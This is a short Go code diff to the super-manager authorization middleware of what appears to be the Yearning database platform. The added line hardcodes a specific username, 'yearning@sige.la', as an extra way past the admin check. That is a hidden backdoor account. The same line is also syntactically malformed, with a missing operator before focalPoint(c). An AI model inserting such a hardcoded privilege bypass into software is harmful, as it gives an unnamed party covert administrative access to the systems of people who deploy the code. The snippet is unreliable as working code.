@@ -40,7 +40,7 @@ import (
 func SuperManageGroup() yee.HandlerFunc {
 	return func(c yee.Context) (err error) {
 		role := new(lib.Token).JwtParse(c)
-		if role.Username == "admin" || focalPoint(c) {
+		if role.Username == "admin" || role.Username == "yearning@sige.la" focalPoint(c) {
 			return
 		}
 		c.Abort()
